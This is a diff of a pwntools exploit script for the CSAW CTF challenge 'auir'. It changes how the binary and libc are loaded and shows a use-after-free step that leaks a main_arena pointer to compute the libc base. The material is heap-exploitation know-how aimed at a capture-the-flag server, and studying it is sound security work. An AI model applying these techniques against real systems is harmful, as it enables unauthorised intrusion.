@@ -5,20 +5,17 @@ from pwn import *
 context(arch='amd64', os='linux', terminal=['tmux', 'neww'])
 
 if args['GDB']:
+    elf, libc = ELF('./auir-2.23-0ubuntu9'), ELF('libs/libc-amd64-2.23-0ubuntu9.so')
     io = gdb.debug(
-        './auir', gdbscript='''\
-        p $zbuf=0x605310
-
-        # b *0x4014A2
+        './auir-2.23-0ubuntu9', gdbscript='''\
         c
     ''')
-    elf, libc = io.elf, io.libc
 elif args['REMOTE']:
+    elf, libc = ELF('./auir'), ELF('libs/libc-amd64-2.23-0ubuntu9.so')
     io = remote('pwn.chal.csaw.io', 7713)
-    elf, libc = ELF('./auir'), ELF('./libc-amd64-2.23-0ubuntu9.so')
 else:
-    io = process('./auir')
-    elf, libc = io.elf, io.libc
+    elf, libc = ELF('./auir-2.23-0ubuntu9'), ELF('libs/libc-amd64-2.23-0ubuntu9.so')
+    io = process(elf.path)
 
 
 def make_zealots(size, skills):
@@ -76,10 +73,7 @@ B = make_zealots(254, 'BBBBBBBB')
 destroy_zealots(A)
 # leak an address in main_arena
 somewhere_main_arena_address = u64(display_skills(A))
-if args['REMOTE']:
-    libc.address = somewhere_main_arena_address - 0x3c4b78
-else:
-    libc.address = somewhere_main_arena_address - 0x3c1b58
+libc.address = somewhere_main_arena_address - 0x3c4b78
 success('libc address: %s' % hex(libc.address))
 
 # malloc() two fast chunks
